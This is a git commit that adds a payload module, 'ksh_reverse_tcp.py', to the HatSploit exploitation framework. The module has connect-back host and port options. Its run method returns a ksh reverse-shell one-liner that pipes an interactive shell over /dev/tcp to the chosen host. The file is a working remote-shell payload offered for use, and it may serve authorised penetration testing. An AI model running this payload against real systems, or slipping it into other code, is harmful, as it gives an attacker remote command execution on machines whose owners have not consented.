a43a6b5aee92a92258866d89a1601f6699d6d01d
Ivan Nikolsky <enty8080@gmail.com>
2021-11-27 16:36:35 +0300

    Create ksh_reverse_tcp.py

---
+++ hatsploit/payloads/unix/generic/ksh_reverse_tcp.py
@@ -0,0 +1,51 @@
+#!/usr/bin/env python3
+
+#
+# This payload requires HatSploit: https://hatsploit.netlify.app
+# Current source: https://github.com/EntySec/HatSploit
+#
+
+import random
+
+from hatsploit.lib.payload import Payload
+from hatsploit.utils.tcp import TCPClient
+
+
+class HatSploitPayload(Payload):
+    details = {
+        'Category': "single",
+        'Name': "KSH shell Reverse TCP",
+        'Payload': "unix/generic/ksh_reverse_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080) - payload developer'
+        ],
+        'Description': "KSH shell reverse TCP payload.",
+        'Comments': [
+            ''
+        ],
+        'Architecture': "generic",
+        'Platform': "unix",
+        'Rank': "high",
+        'Type': "reverse_tcp"
+    }
+
+    options = {
+        'CBHOST': {
+            'Description': "Connect-back host.",
+            'Value': TCPClient.get_local_host(),
+            'Type': "ip",
+            'Required': True
+        },
+        'CBPORT': {
+            'Description': "Connect-back port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        }
+    }
+
+    def run(self):
+        connback_host, connback_port = self.parse_options(self.options)
+
+        payload = f"ksh -c 'ksh >/dev/tcp/{connback_host}/{connback_port} 2>&1 <&1'"
+        return payload
